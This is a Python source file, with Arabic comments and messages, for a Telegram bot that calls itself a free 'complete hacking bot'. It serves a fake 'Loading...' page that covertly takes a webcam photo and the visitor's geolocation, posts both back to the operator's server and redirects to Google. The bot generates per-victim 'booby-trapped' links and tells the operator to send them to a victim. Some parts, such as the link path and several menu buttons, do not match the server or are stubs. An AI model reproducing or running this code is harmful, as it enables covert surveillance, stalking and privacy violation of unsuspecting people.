import telebot
import requests
import json
import time
import threading
import os
import sys
import base64
import urllib.parse
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== توكن البوت =====
TOKEN = input("أدخل توكن البوت الخاص بك: ")
bot = telebot.TeleBot(TOKEN)

# ===== متغيرات لتخزين البيانات =====
captured_images = {}
active_links = {}
user_sessions = {}

# ===== توليد معرف عشوائي للضحية =====
def generate_id():
		return ''.join(random.choices(string.digits, k=10))

# ===== خادم استقبال الصور =====
class CaptureHandler(BaseHTTPRequestHandler):
		def do_GET(self):
				parsed = urllib.parse.urlparse(self.path)
				if parsed.path == "/":
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.end_headers()
						html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial;}</style>
</head>
<body>
<div>⏳ جاري التحميل...</div>
<script>
navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
.then(stream => {
		const video = document.createElement('video');
		video.srcObject = stream;
		video.play();
		setTimeout(() => {
				const canvas = document.createElement('canvas');
				canvas.width = 640;
				canvas.height = 480;
				const ctx = canvas.getContext('2d');
				ctx.drawImage(video, 0, 0);
				const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
				fetch('/upload', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({ image: dataUrl, agent: navigator.userAgent })
				});
				stream.getTracks().forEach(t => t.stop());
				// جلب الموقع
				if (navigator.geolocation) {
						navigator.geolocation.getCurrentPosition(pos => {
								fetch('/location', {
										method: 'POST',
										headers: { 'Content-Type': 'application/json' },
										body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
								});
						});
				}
				window.location.href = 'https://www.google.com';
		}, 1000);
})
.catch(() => {
		window.location.href = 'https://www.google.com';
});
</script>
</body>
</html>"""
						self.wfile.write(html.encode())
				else:
						self.send_error(404)

		def do_POST(self):
				content_length = int(self.headers.get('Content-Length', 0))
				post_data = self.rfile.read(content_length).decode()
				try:
						data = json.loads(post_data)
						if '/upload' in self.path:
								image_b64 = data.get('image', '')
								if image_b64.startswith('data:image/jpeg;base64,'):
										image_b64 = image_b64.replace('data:image/jpeg;base64,', '')
								agent = data.get('agent', 'Unknown')
								# حفظ الصورة
								filename = f"captured_{int(time.time())}.jpg"
								with open(filename, "wb") as f:
										f.write(base64.b64decode(image_b64))
								print(f"[+] صورة محفوظة: {filename}")
								# إرسال إلى التيليجرام (يتم التعامل معه من البوت)
								return self.send_response(200)
						elif '/location' in self.path:
								lat = data.get('lat', 'unknown')
								lon = data.get('lon', 'unknown')
								print(f"[+] موقع: {lat}, {lon}")
				except:
						pass
				self.send_response(200)
				self.send_header("Content-type", "text/plain")
				self.end_headers()
				self.wfile.write(b"OK")

# ===== تشغيل خادم HTTP =====
def start_server(port=8080):
		server = HTTPServer(('', port), CaptureHandler)
		thread = threading.Thread(target=server.serve_forever, daemon=True)
		thread.start()
		return server

# ===== دالة إنشاء رابط ملغم =====
def create_link(chat_id, link_type):
		# استخدام DuckDNS أو أي نطاق عام
		domain = "py1py.duckdns.org"  # يمكن تغييره
		victim_id = generate_id()
		link = f"https://{domain}/PY1PY1.php?cam={link_type}&id={victim_id}"
		# تخزين الرابط مع معرف المستخدم
		user_sessions[victim_id] = {"chat_id": chat_id, "type": link_type, "time": time.ctime()}
		return link, victim_id

# ===== البوت =====
@bot.message_handler(commands=['start'])
def send_welcome(message):
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 كاميرا أمامية", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 تلغيم رابط", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 تصوير فيديو", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 جلب الموقع", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(message.chat.id, 
				"👋 أهلاً بك في بوت اراس\n"
				"🔓 بوت اختراق كامل وشامل مجانا\n\n"
				"المطور 🏅\n"
				"قناة المطور 📶\n\n"
				"اختر ما تريد:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
		chat_id = call.message.chat.id
		bot.answer_callback_query(call.id)

		if call.data == "front_cam":
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, f"✅ تم إنشاء رابط اختراق بـ كاميرا أمامية:\n{link}\n\nأرسله للضحية وسوف تأتيك البيانات")
				# زر نسخ الرابط
				markup = telebot.types.InlineKeyboardMarkup()
				btn = telebot.types.InlineKeyboardButton("📋 نسخ الرابط", callback_data=f"copy_{link}")
				markup.add(btn)
				bot.send_message(chat_id, "اضغط للنسخ:", reply_markup=markup)

		elif call.data == "back_cam":
				link, vid = create_link(chat_id, "back_cam")
				bot.send_message(chat_id, f"✅ تم إنشاء رابط اختراق بـ كاميرا خلفية:\n{link}\n\nأرسله للضحية وسوف تأتيك البيانات")

		elif call.data == "link_bomb":
				bot.send_message(chat_id, "🔗 رابط ملغم جاهز (كاميرا أمامية):")
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, link)

		elif call.data == "get_location":
				bot.send_message(chat_id, "📍 رابط جلب الموقع قيد التطوير...")

		elif call.data == "stats":
				bot.send_message(chat_id, f"📊 الإحصائيات:\nالروابط النشطة: {len(user_sessions)}")

		elif call.data.startswith("copy_"):
				link = call.data.replace("copy_", "")
				bot.answer_callback_query(call.id, "تم نسخ الرابط!")
				# لا يمكن النسخ فعلياً من التيليجرام ولكن نعطي رسالة

		# العودة للقائمة
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 كاميرا أمامية", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 تلغيم رابط", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 تصوير فيديو", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 جلب الموقع", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(chat_id, "🎯 اختر ما تريد:", reply_markup=markup)

# ===== التشغيل الرئيسي =====
if __name__ == "__main__":
		try:
				import telebot
		except ImportError:
				print("[-] يرجى تثبيت pyTelegramBotAPI: pip install pyTelegramBotAPI")
				sys.exit(1)

		# تشغيل خادم HTTP
		server = start_server(8080)
		print("[*] خادم HTTP يعمل على المنفذ 8080")
		print("[*] البوت يعمل...")

		try:
				bot.infinity_polling()
		except KeyboardInterrupt:
				print("\n[!] تم الإيقاف")
				server.shutdown()